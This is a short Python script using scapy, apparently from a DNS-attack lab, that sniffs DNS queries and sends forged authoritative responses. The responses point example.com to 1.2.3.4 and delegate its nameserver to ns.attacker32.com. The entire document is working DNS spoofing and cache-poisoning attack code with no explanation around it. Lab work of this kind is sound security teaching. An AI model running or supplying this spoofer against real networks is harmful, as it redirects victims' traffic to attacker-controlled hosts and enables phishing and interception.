#!/usr/bin/env python3
from scapy.all import *

NS_NAME = "example.com"

def spoof_dns(pkt):
    if DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8'):
        print(pkt.sprintf("[+] Spoofing: %IP.src% --> %IP.dst% | DNS ID: %DNS.id%"))

        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)

        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='1.2.3.4')
        NSsec = DNSRR(rrname="example.com", type="NS", ttl=259200, rdata="ns.attacker32.com")

        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=1, nscount=1, arcount=0,
                  an=Anssec, ns=NSsec)

        spoofpkt = ip / udp / dns
        send(spoofpkt)
        print("[+] Sent spoofed packet.")

iface = "br-xxxxxxxxxxxx"  # Replace with actual interface
f = "udp and dst port 53"
print("[*] Listening for DNS queries on interface:", iface)
sniff(iface=iface, filter=f, prn=spoof_dns)